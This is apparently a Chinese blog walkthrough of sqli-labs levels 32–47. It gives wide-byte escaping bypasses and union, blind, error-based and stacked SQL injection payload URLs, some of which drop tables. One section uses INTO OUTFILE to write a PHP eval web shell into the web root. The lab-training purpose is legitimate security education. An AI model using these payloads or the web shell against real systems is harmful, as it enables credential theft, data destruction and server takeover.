<h2 id="Less-32-GET-Bypass-custom-filter-adding-slashes-to-dangerous-chars"><a href="#Less-32-GET-Bypass-custom-filter-adding-slashes-to-dangerous-chars" class="headerlink" title="Less-32:GET - Bypass custom filter adding slashes to dangerous chars."></a>Less-32:GET - Bypass custom filter adding slashes to dangerous chars.</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">法一：</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-32&#x2F;?id&#x3D;1 这个时候返回的是正常数据</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-32&#x2F;?id&#x3D;1’ 此时返回的是经过转义之后的数据，我们通过返回的数据可以看到，单引号已经被转义了 </span><br><span class="line">3. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-32&#x2F;?id&#x3D;1%df‘ 或者http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-32&#x2F;?id&#x3D;1%df%27此时发现出现了注入点，这个时候我们继续</span><br><span class="line">4. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-32&#x2F;?id&#x3D;1%df’ --+ 这个时候返回正常</span><br><span class="line">5. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-32&#x2F;?id&#x3D;1%df‘ order by 4 --+ 此时返回与以前的关卡中同样的错误，接下来就是正常的注入操作了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/13/sqlo-labs/image-20200524124956905.png" alt="image-20200524124956905"></p>
<p><strong>法二：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">法二：</span><br><span class="line">%5c代表的是 \ </span><br><span class="line">此时构造： %5c %5c %5c %5c’</span><br><span class="line">只要是我们能将返回的结果中对于单引号没有转义字符进行处理即可。</span><br><span class="line">示例方法： http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-32&#x2F;?id&#x3D;-1%aa%5c&#39; union select 1,2,3 --+</span><br><span class="line">其余操作基本相似。 </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">每一步的转换</span><br><span class="line">%aa%5c&#39;       %5c是：\即反斜杠  %27是：&#39; 单引号</span><br><span class="line">%aa%5c%27</span><br><span class="line">%aa%5c%5c%5c%27</span><br><span class="line">%aa%5c %5c%5c%27</span><br><span class="line">猏 \\ &#39;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/13/sqlo-labs/image-20200524130042085.png" alt="image-20200524130042085"></p>
<h2 id="Less-33-GET-Bypass-Addslashes"><a href="#Less-33-GET-Bypass-Addslashes" class="headerlink" title="Less-33: GET - Bypass Addslashes()"></a>Less-33: GET - Bypass Addslashes()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">通过源码可得知： 在32关中使用的是自定义的过滤，本关中使用的是php中的 addslashes()函数</span><br><span class="line">其作用:addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。(参考链接：https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;func_string_addslashes.asp)</span><br><span class="line">法1： 直接使用宽字节的方法</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-33&#x2F;?id&#x3D;1%df’--+</span><br></pre></td></tr></table></figure>

<p><strong>法二：自定义闭合</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">法二：自定义闭合</span><br><span class="line">http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-33&#x2F;?id&#x3D;-1%aa%5c%27 union select 1,2,3--+</span><br><span class="line">其实和less32关基本相同。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/13/sqlo-labs/image-20200526105037591.png" alt="image-20200526105037591"></p>
<h2 id="Less-34-POST-Bypass-AddSlashes"><a href="#Less-34-POST-Bypass-AddSlashes" class="headerlink" title="Less-34: POST - Bypass AddSlashes()"></a>Less-34: POST - Bypass AddSlashes()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">我们首先测试在POST情况下，传入正确和错误的值回显情况：</span><br><span class="line">1.   admin:admin 正确的密码和账号  --&gt;   返回姓名等常规信息</span><br><span class="line">2.   ad:ad   错误的密码和账号返回的是登录失败</span><br><span class="line">3.   同样通过代码可知，本关也使用了addslashes()函数，理论上我们可以使用前几关中的宽字节注入的方法进行测试，但是测试的时候发现，方法并不奏效。（主要原因是因为我们不能够直接在POST中传入数据，因为会被再次编码）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong>在<code>get</code>型传参的时候使用<code>URLencode</code>，所以我们可以使用以下两种方法：<br><strong>法一：</strong>我们借鉴了将单引号的<code>UTF-8</code>转换为<code>UTF-16</code>的单引号模式 <code>‘ -&gt; �&#39;</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">借鉴了将单引号的UTF-8转换为UTF-16的单引号模式 ‘ -&gt;  �’(注意，在复制的时候要将单引号重新打出来，因为在ppt中总会因为奇怪的格式出现错误)</span><br><span class="line">在POST中传入的数据： �\‘ union select 1,2# （注意：在这里不能够再使用--+ --空格等这样的注释符，我们推荐使用#）</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>法二：</strong>我们使用burpsuite进行抓包之后对数据进行宽字节注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">我们首先在使用bp进行抓包之后，在bp中修改信息得到返回信息即可！</span><br><span class="line">1. 我们本来传入的数据： a%df’</span><br><span class="line">2. 但是我们抓包之后的数据： uname&#x3D;a%25df%2527&amp;passwd&#x3D;a%25df%2527&amp;submit&#x3D;Submit</span><br><span class="line">我们可以发现%经过url转换之后为%25</span><br><span class="line">所以我们需要在拦截数据包之后将数据进行修改： uname&#x3D;a%df%27&amp;passwd&#x3D;a%df%27&amp;submit&#x3D;Submit</span><br><span class="line">接下来就是正常的注入流程。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-35-GET-Bypass-Add-Slashes-we-dont-need-them-Integer-based"><a href="#Less-35-GET-Bypass-Add-Slashes-we-dont-need-them-Integer-based" class="headerlink" title="Less-35:GET - Bypass Add Slashes (we dont need them) Integer based"></a>Less-35:GET - Bypass Add Slashes (we dont need them) Integer based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">其实本关和34基本相同，我们首先分析一下代码：</span><br><span class="line">$id&#x3D;check_addslashes($_GET[‘id’]);  首先还是对id的值进行过滤处理</span><br><span class="line">$sql&#x3D;“SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1”; 在这个位置中，id值没有经过单引号的包裹，所以我们只要在注入的时候防止我们构造的sql注入句子中避免单引号等即可！</span><br></pre></td></tr></table></figure>

<p><strong>法一：</strong> 联合查询注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-35&#x2F;?id&#x3D;-1 union select 1,2,group_concat(schema_name) from    information_schema.schemata#</span><br></pre></td></tr></table></figure>

<p><strong>法二：</strong>延时注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-35&#x2F;?id&#x3D;1 and  if( length(database())&#x3D;1, 1, sleep(5)    )#通过这样的方式进行判断。</span><br></pre></td></tr></table></figure>



<h2 id="Less-36-：-GET-Bypass-MysQL-real-escape-string"><a href="#Less-36-：-GET-Bypass-MysQL-real-escape-string" class="headerlink" title="Less-36 ：  GET -Bypass MysQL real escape string"></a>Less-36 ：  GET -Bypass MysQL real escape string</h2><p><code>mysql_real_escape_string() </code>函数转义 SQL 语句中使用的字符串中的特殊字符。  </p>
<p>下列字符受影响：  </p>
<ul>
<li><code>\x00</code></li>
<li><code>\n</code></li>
<li><code>\n</code></li>
<li><code>\</code></li>
<li><code>&#39;</code></li>
<li><code>&quot;</code></li>
<li><code>\x1a</code></li>
</ul>
<p>如果成功， 则该函数返回被转义的字符串。 如果失败， 则返回 false  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">我们首先进行源代码审计，发现代码中使用了mysql_real_escape_string函数（参考：https:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;func_mysql_real_escape_string.asp）</span><br><span class="line"></span><br><span class="line">我们此处尝试直接使用原来的宽字节注入：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-36&#x2F;?id&#x3D;1%df’ # 发现有作用，可以进行注入</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-36&#x2F;?id&#x3D;1111%df‘   union select 1,2,3 --+ 接下来就是正常的注入流程了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>完整演示</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-36&#x2F;?id&#x3D;1111%df‘   union select 1,2,group_concat(schema_name) from information_schema.schemata  --+ 1取出所有的库</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-36&#x2F;?id&#x3D;1111%df‘   union select 1,2,group_concat(table_name) from  information_schema.tables where table_schema &#x3D; 0x7365637572697479  --+ 取出所有的表</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-36&#x2F;?id&#x3D;1111%df‘   union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273  --+ 取出所有的字段</span><br><span class="line">4. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-36&#x2F;?id&#x3D;1111%df‘   union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users  --+ 取出所有的字段的值</span><br><span class="line">注意：为什么一直强调能够使用十六进制的就使用十六进制，因为本关中单引号全部会被转义</span><br></pre></td></tr></table></figure>

<p><strong>Notice:</strong><br>在使用<code> mysql_real_escape_string()</code>时， 如何能够安全的防护这种问题， 需要将 <code>mysql </code>设置为<code>gbk </code>即可。<br><strong>设置代码：</strong><br><code>Mysql_set_charset(‘gbk’,’$conn’)  </code></p>
<h2 id="Less-37-POST-Bypass-MysQL-real-escape-string"><a href="#Less-37-POST-Bypass-MysQL-real-escape-string" class="headerlink" title="Less-37: POST- Bypass MysQL real escape string"></a>Less-37: POST- Bypass MysQL real escape string</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">我们首先测试在POST情况下，传入正确和错误的值回显情况：</span><br><span class="line">1.   admin:admin 正确的密码和账号 --&gt; 返回姓名等常规信息</span><br><span class="line">2.   ad:ad   错误的密码和账号--&gt;返回的是登录失败</span><br><span class="line">3.   与34关基本相似，本关只是将过滤函数进行了替换： mysql_real_escape_string()，同样，我们可以直接按照34关的方法即可！</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>分析</strong>：在get型传参的时候使用URLencode，所以我们可以使用以下两种方法：</p>
<p><strong>法一：</strong>我们借鉴了将单引号的UTF-8转换为UTF-16的单引号模式 ‘ –&gt; �’<br><strong>法二：</strong>我们使用burpsuite进行抓包之后对数据进行宽字节注入</p>
<p>详见34</p>
<p><img src="/2020/07/13/sqlo-labs/image-20200526120144920.png" alt="image-20200526120144920"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Summary:<br>从上面的几关当中， 可以总结一下过滤 <code>‘ \</code> 常用的<strong>三种</strong>方式是直接<code> replace，addslashes(),mysql_real_escape_string()</code>。 三种方式仅仅依靠一个函数是不能完全防御的， 所以我们在编写代码的时候需要考虑的更加仔细。 同时在上述过程中， 我们也给出三种防御的方式， 相信仔细看完已经明白了， 这里就不赘述了。</p>
<h1 id="Page3-Stacked-injection"><a href="#Page3-Stacked-injection" class="headerlink" title="Page3  Stacked injection"></a>Page3  Stacked injection</h1><h2 id="Less-38：-Future-Editions"><a href="#Less-38：-Future-Editions" class="headerlink" title="Less-38： Future Editions"></a>Less-38： Future Editions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">我们直接构造语句：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-38&#x2F;?id&#x3D;1&#39;; create table crow like users; --+</span><br><span class="line">然后在数据库中查看是否可以完成执行： show tables;</span><br><span class="line">我们可以构造数据删除已经创建的表:</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-38&#x2F;?id&#x3D;1&#39;; drop table crow ; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/13/sqlo-labs/image-20200526145510213.png" alt="image-20200526145510213"></p>
<h2 id="Less-39-GET-Stacked-Query-Injection-Intiger-based"><a href="#Less-39-GET-Stacked-Query-Injection-Intiger-based" class="headerlink" title="Less-39: .GET - Stacked Query Injection- Intiger based"></a>Less-39: .GET - Stacked Query Injection- Intiger based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">与less38不相同的地方是sql语句的id值处理：我们将38中的id&#x3D;‘ ’; 修改为id&#x3D; ; 即可</span><br><span class="line">我们直接构造语句：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-39&#x2F;?id&#x3D;1 ; create table crow like users; --+</span><br><span class="line">然后在数据库中查看是否可以完成执行： show tables;</span><br><span class="line">我们可以构造数据删除已经创建的表:</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-39&#x2F;?id&#x3D;1 ; drop table crow ; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">与less38、39不相同的地方是这里的错误不会回显，但是不影响我们注入测试，而且我们将id修改为id&#x3D;(‘ ’);</span><br><span class="line">我们直接构造语句：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-40&#x2F;?id&#x3D;1&#39;); create table crow like users; --+</span><br><span class="line">然后在数据库中查看是否可以完成执行： show tables;</span><br><span class="line">我们可以构造数据删除已经创建的表:</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-40&#x2F;?id&#x3D;1&#39;); drop table crow ; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">和40关相同，没有回显信息，但是不影响我们注入测试，而且id值没有经过包裹；</span><br><span class="line">我们直接构造语句：</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-41&#x2F;?id&#x3D;1 ; create table crow like users; --+</span><br><span class="line">然后在数据库中查看是否可以完成执行： show tables;</span><br><span class="line">我们可以构造数据删除已经创建的表:</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-40&#x2F;?id&#x3D;1 ; drop table crow ; --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">当我们第一眼看到这个界面的时候，感觉和二次注入是不是有点像，但是这里和二次注入有一点不同：</span><br><span class="line">我们直接来到login.php中，观察username和password的处理问题：</span><br><span class="line">$username &#x3D; mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);  </span><br><span class="line"> $password &#x3D; $_POST[&quot;login_password&quot;];</span><br><span class="line"> </span><br><span class="line">此时的sql为： &quot;SELECT * FROM users WHERE username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$password&#39;&quot;</span><br><span class="line">我们可以看到password没有经过mysqli_real_escape_string()函数进行处理，所以这个时候我们在这个位置进行构造：</span><br><span class="line">在登录的时候，我们使用任意的username，password可以构造为：</span><br><span class="line">a’; create table crow like users; #   然后观察是否有crow表</span><br><span class="line">a‘;  drop table crow; # 观察crow表是否删除</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">这一关和less42非常像，区别就在于对于id值得处理：</span><br><span class="line">此时的sql为： $sql &#x3D; &quot;SELECT * FROM users WHERE username&#x3D;(&#39;$username&#39;) and password&#x3D;(&#39;$password’)”;</span><br><span class="line">在登录的时候，我们使用任意的username，password可以构造为：</span><br><span class="line">a’); create table crow like users; #   然后观察是否有crow表</span><br><span class="line">a‘);  drop table crow; # 观察crow表是否删除</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">本关和前面的基本是一样的，只是没有报错回显信息</span><br><span class="line">此时的sql为： $sql &#x3D; &quot;SELECT * FROM users WHERE username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$password&#39;&quot;;</span><br><span class="line">在登录的时候，我们使用任意的username，password可以构造为：</span><br><span class="line">a’; create table crow like users; #   然后观察是否有crow表</span><br><span class="line">a‘;  drop table crow; # 观察crow表是否删除</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">本关和less43关的基本是一样的，只是没有报错回显信息</span><br><span class="line">此时的sql为： $sql &#x3D; &quot;SELECT * FROM users WHERE username&#x3D;(&#39;$username&#39;) and password&#x3D;(&#39;$password’)”;</span><br><span class="line">在登录的时候，我们使用任意的username，password可以构造为：</span><br><span class="line">a’); create table crow like users; #   然后观察是否有crow表</span><br><span class="line">a‘);  drop table crow; # 观察crow表是否删除</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="总结-堆叠注入写一句话木马"><a href="#总结-堆叠注入写一句话木马" class="headerlink" title="总结_堆叠注入写一句话木马"></a>总结_堆叠注入写一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在上面的关卡中，基本上都是在创建表，删除表，我的操作会让大家感觉堆叠注入好像没有什么太大的用处，我们利用less45来写一个一句话木马：</span><br><span class="line">php一句话木马：&lt;?php   @eval($_POST[crow]); ?&gt;</span><br><span class="line">绝对路径： C:\phpstudy\PHPTutorial\WWW\</span><br><span class="line">使用函数： select xxx into  outfile xxx</span><br><span class="line">select &#39;&lt;?php @eval($_POST[crow]);?&gt;&#39; into outfile &#39;C:\\phpstudy\\PHPTutorial\\WWW\\crow.php&#39;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">为了测试方便，我们在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’   sort的 值我们可以设置1,2,3均可!</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’  desc此时结果以第三列的降序进行排列</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’ asc此时的结果以第 三列的升序进行排列，说明在sort位置存在注入漏洞</span><br><span class="line">4. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;left(database() ,1 )这里面显示没有什么反应，那么我们尝试使用延时注入或者是报错注入来尝试一下</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>延时注入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">法一:延时注入</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’ and if( length(database()&#x3D;1 ),1,sleep(5)) - +判断数据库长度</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’ and if (left( (select schema name from information schema.schemata limit 0,1)，1)&gt;&#39;a&#39; ,1, sleep(5)) -+判断数据库中第一 个库的第一 位的值是否大于a</span><br></pre></td></tr></table></figure>

<p><strong>报错注入</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">法二:报错注入</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’ and updatexml( 1, concat( 0x7e, database(), 1) -+爆出当前使用数据库名称</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlii&#x2F;Lesss 46&#x2F;?sort&#x3D;3’ and updatexml(1, concat(0x7e, ( select schema_name from</span><br><span class="line">information. schema.schemata limit 0,1) ) ,1) +爆出数据库中的第一个值， 可以使用遍历的思想去继续操作下去</span><br><span class="line">因为我自己将ppt中后面</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>本关的 sql 语句为<code> $sql = &quot;SELECT * FROM users ORDER BY &#39;$id&#39;&quot;;</code>将 id 变为字符型， 因此根据我们上述提到的知识， 我们依旧按照<strong>注入的位置</strong>进行分类。<br><strong>（1）  order by 后的参数</strong><br>我们只能使用 <code>and </code>来进行<code>报错和延时注入</code>。 我们下面给出几个 payload 示例。<br><strong>①</strong> <code>and rand </code>相结合的方式， <strong>payload</strong>：<code>http://127.0.0.1/sqli-labs/Less-47/index.php?sort=1%27and%20rand(ascii(left(database(),1))=115)--+ </code>,换成 116 后，<code>http://127.0.0.1/sqli-labs/Less-47/index.php?sort=1%27and%20rand(ascii(left(database(),1))=116)--+ </code>.此处后期经过测试， 还是存在问题的， 我们不能使用这种方式进行准确的注入。  </p>
<p><strong>②</strong>可以利用<strong>报错的方式</strong>进行<br><code>http://127.0.0.1/sqli-labs/Less-47/?sort=1%27and%20(select%20count(*)%20from%20informati on_schema.columns%20group%20by%20concat(0x3a,0x3a,(select%20user()),0x3a,0x3a,floor(rand()*2)))--+  </code></p>
